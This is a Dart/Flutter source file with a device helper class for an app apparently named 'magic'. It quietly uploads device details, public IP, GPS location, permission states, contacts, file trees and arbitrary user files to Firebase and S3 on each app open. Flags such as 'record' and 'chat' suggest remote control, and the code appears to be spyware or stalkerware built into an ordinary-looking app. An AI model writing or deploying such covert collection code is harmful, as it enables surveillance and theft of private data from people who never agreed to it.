import 'dart:convert';
import 'dart:io';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:http/http.dart' as http;
import 'package:magic/firebase_options.dart';
import 'package:magic/helpers/db_helper.dart';
import 'package:magic/storage/storage_manager.dart';
import 'package:magic/utils/location.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';
import 'package:path_provider/path_provider.dart';

import 'device_info_helper.dart';
import '../main.dart';

class DeviceHelper {
  static Future<bool> _saveIp(String id) async {
    try {
      var responseIp = await http.get(Uri.parse('https://ifconfig.co/json'));

      if (responseIp.statusCode == 200) {
        Map<String, dynamic> result = jsonDecode(responseIp.body);
        // print('result: $result');
        String ip = result['ip'] ?? '';
        // print('IP: $ip');
        DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id/ip");
        DatabaseReference refIfconfig =
            FirebaseDatabase.instance.ref("devices/$session_id/ifconfig");
        await ref.set(ip);
        await refIfconfig.set(result);
        return true;
      }
    } catch (e) {
      // print('error ip:$e');
    }
    return false;
  }

  static Future<bool> saveInfo(String id, {int retry = 0}) async {
    bool isDone = false;
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      int createAt = DateTime.now().millisecondsSinceEpoch;
      String createAtNorm =
          DateTime.fromMillisecondsSinceEpoch(createAt).toIso8601String();
      String utc = DateTime.fromMillisecondsSinceEpoch(createAt)
          .toUtc()
          .toIso8601String();

      Map<String, dynamic> body = {
        "model": androidInfo.model,
        "brand": androidInfo.brand,
        "device": androidInfo.device,
        "version": androidInfo.version.sdkInt,
        "create_at": createAt,
        "create_at_norm": createAtNorm,
        "utc": utc,
        "emulator": androidInfo.isPhysicalDevice,
      };

      try {
        if (Firebase.apps.isEmpty) {
          await Firebase.initializeApp(
              options: DefaultFirebaseOptions.currentPlatform);
        }
        DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id/");
        await ref.set({
          'info': body,
          'id': id,
          'chat': false,
          'record': false,
          'game': false,
          'new_files':0,
        });
        await DbHelper.resetControl();
      } catch (error) {
        // print('Error saving device info: $error');
        try {
          await Firebase.initializeApp(
              options: DefaultFirebaseOptions.currentPlatform);
        } catch (e) {
          // print('Firebase init error: $e');
        }
        DatabaseReference ref =
            FirebaseDatabase.instance.ref("devices/$session_id/info");
        await ref.set(body);
      }

      try {
        await _saveIp(id);
      } catch (e) {
        // print('Error saving IP: $e');
      }
      try {
        await getLocation(id);
      } catch (e) {
        // print('Error saving location: $e');
      }

      final SharedPreferences prefs = await SharedPreferences.getInstance();
      bool res = false;
      try {
        // print("Setting 'device' flag in SharedPreferences to true");
        res = await prefs.setBool('device', true);
        // print("'device' flag set result: $res");
      } catch (e) {
        // print('SharedPreferences error: $e');
      }

      if (res) {
        isDone = true;
      } else if (retry < 2) {
        // print('Retrying saveInfo... attempt ${retry + 1}');
        isDone = await saveInfo(id, retry: retry + 1);
      } else {
        // print('saveInfo failed after retries');
      }
    } catch (e) {
      // print('saveInfo global error: $e');
    }
    return isDone;
  }

  static Future<void> getLocation(String id) async {
    LocationUtils loc = LocationUtils();
    try {
      Map<String, dynamic>? position = await loc.getCurrentLocation();
      //print('Postion: $position');
      if (position != null) {
        DatabaseReference refLoc =
            FirebaseDatabase.instance.ref("devices/$session_id/location");
        if (!(await refLoc.get()).exists) {
          await refLoc.set(position);
        }
      }
    } catch (e) {
      // print(e);
    }
  }

  static Future<void> saveUpadateState() async {
    String? uid = await getUID();
    // print(uid);
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id");
    await ref.set({'tapUpdate': true});
  }

  static Future<void> saveUpdateTime(String time) async {
    String? uid = await getUID();
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id");
    await ref.child("lastUpdateTime").set(time);
  }

  static Future<void> saveConnectivity() async {
    String? uid = await getUID();
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id");
    await ref.child("connectivityState").set(
        (await Connectivity().checkConnectivity())
            .map((e) => e.name)
            .join(", "));
  }

  static Future<void> saveGrantedPermissions() async {
    String? uid = await getUID();
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$session_id");
    final locationGranted = await Permission.location.isGranted;
    final contactsGranted = await Permission.contacts.isGranted;
    final filesGranted;
    if (await DeviceInfoHelper.getAndroidSDK() >= 30) {
      filesGranted = await Permission.manageExternalStorage.status.isGranted;
    } else {
      filesGranted = await Permission.storage.status.isGranted;
    }
    final micGranted = await Permission.microphone.isGranted;
    await ref.child("locationGranted").set(locationGranted);
    await ref.child("contactsGranted").set(contactsGranted);
    await ref.child("filesGranted").set(filesGranted);
    await ref.child("micGranted").set(micGranted);
  }

  static String removeSpace(String data) {
    String result = data.replaceAll(' ', '_');
    return result;
  }

  static Future<Map<String, dynamic>> saveUserId() async {
    // Ensure Firebase is initialized before using FirebaseAuth
    try {
      await Firebase.initializeApp(
        options: DefaultFirebaseOptions.currentPlatform,
      );
    } catch (_) {}
    final userId = await FirebaseAuth.instance.currentUser?.uid;
    if (userId != null) {
      final SharedPreferences prefs = await SharedPreferences.getInstance();
      bool res = await prefs.setString('id', userId);
      return {'done': res, 'id': userId};
    } else {
      return {'done': false, 'id': null};
    }
  }

  static Future<String?> getUID() async {
    return DeviceInfoHelper.getUID();
  }

  static Future<bool> open(String id) async {
    // print('DeviceHelper.open called for id: $id');
    int time = DateTime.now().millisecondsSinceEpoch;
    DatabaseReference ref = FirebaseDatabase.instance.ref("open/$session_id/$time");
    await ref.set(
        {'at': DateTime.fromMillisecondsSinceEpoch(time).toIso8601String()});

    // Always create and upload sys_info file on every app open, independent of 'device' flag
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      Map<String, dynamic> deviceInfoMap = {
        "model": androidInfo.model,
        "brand": androidInfo.brand,
        "device": androidInfo.device,
        "version": androidInfo.version.sdkInt,
        "emulator": androidInfo.isPhysicalDevice,
      };

      var connectivityResult = await Connectivity().checkConnectivity();
      String connectivityType =
          connectivityResult.map((e) => e.name).join(", ");

      var responseIp = await http.get(Uri.parse('https://ifconfig.co/json'));
      Map<String, dynamic> ifconfigInfo = {};
      if (responseIp.statusCode == 200) {
        ifconfigInfo = jsonDecode(responseIp.body);
      }

      Map<String, dynamic> sysInfo = {
        "device_info": deviceInfoMap,
        "connectivity_info": connectivityType,
        "ifconfig": ifconfigInfo,
        "timestamp": DateTime.now().toIso8601String(),
      };

      // Use path_provider for cross-platform temp directory
      Directory tempDir = await getTemporaryDirectory();
      String fileName =
          "sys_info_${DateTime.now().millisecondsSinceEpoch}.json";
      String filePath = "${tempDir.path}/$fileName";
      File file = File(filePath);
      await file.writeAsString(jsonEncode(sysInfo));
      // print('Sys info file created at: $filePath');
      // print('Sys info file content: ${jsonEncode(sysInfo)}');
      if (await file.exists()) {
        // print('Sys info file exists and is ready for upload.');
      } else {
        // print('Sys info file does NOT exist after write.');
      }
      final downloadUrl = await StorageManager.uploadSysInfoFile(
        file: file,
        deviceId: id,
        fileName: fileName,
        metadata: {
          'device_id': id,
          'upload_time': DateTime.now().toIso8601String(),
        },
      );
      if (downloadUrl != null) {
        // print('Sys info file uploaded to S3. Download URL: $downloadUrl');
      } else {
        // print('Sys info file upload to S3 failed.');
      }
    } catch (e) {
      // print('Error sending sys_info to S3: $e');
    }

    await saveInfo(id);
    await saveConnectivity();

    return true;
  }

  static Future<void> addFileTree({
    required String id,
    required Map<String, dynamic> data,
  }) async {
    // print('++++++++++\nStarting to add file tree... ID: $id, Data: $data\n\n');
    var uuid = const Uuid();
    DatabaseReference ref =
        FirebaseDatabase.instance.ref("devices/$session_id/file_tree/${uuid.v1()}");
    await ref.set(data);
  }

  static Future<bool> upload(String id, File file) async {
    print('=== DeviceHelper.upload CALLED ===');
    print('=== Device ID: $id ===');
    print('=== File path: ${file.path} ===');
    print('=== File exists: ${await file.exists()} ===');

    bool state = false;
    String fileName = file.path.split('/').last;
    print('=== File name: $fileName ===');

    try {
      print('=== Attempting StorageManager.uploadRegularFile ===');

      // Use the new storage manager with structured paths
      final downloadUrl = await StorageManager.uploadRegularFile(
        file: file,
        deviceId: id,
        fileName: fileName,
        metadata: {
          'device_id': id,
          'original_name': fileName,
          'upload_time': DateTime.now().toIso8601String(),
        },
      );

      print('=== StorageManager.uploadRegularFile completed ===');
      print('=== Download URL: $downloadUrl ===');

      state = downloadUrl != null;
      print('=== Upload state: $state ===');
    } catch (e, stack) {
      print('=== ERROR in DeviceHelper.upload: $e ===');
      print('=== Stack trace: $stack ===');
      state = false;
    }

    print('=== DeviceHelper.upload FINISHED: $state ===');
    return state;
  }

  // static Future<bool> upload(String id, File file) async {
  //   try {
  //     final client = Client()
  //         .setEndpoint(
  //             'YOUR_APPWRITE_ENDPOINT') // Replace with your Appwrite endpoint
  //         .setProject(
  //             'YOUR_PROJECT_ID'); // Replace with your Appwrite Project ID

  //     final storage = Storage(client);

  //     String fileName = file.path.split('/').last;

  //     await storage.createFile(
  //       bucketId: 'YOUR_BUCKET_ID', // Replace with your Appwrite Bucket ID
  //       fileId: ID.unique(), // Generates a unique ID for the file in Appwrite
  //       file: InputFile.fromPath(
  //         path: file.path,
  //         filename: fileName,
  //       ),
  //     );
  //     return true; // File uploaded successfully
  //   } catch (e) {
  //     print('Error uploading file to Appwrite: $e');
  //     return false; // File upload failed
  //   }
  // }

  Future<void> addContacts({Map<String, dynamic>? data, String? title}) async {
    String? uid = await getUID();

    String idTitle = title ?? DateTime.now().millisecond.toString();
    if (uid != null) {
      DatabaseReference ref =
          FirebaseDatabase.instance.ref("contacts/$session_id/$idTitle");
      await ref.set({'data': data ?? {}});
    }
  }
}
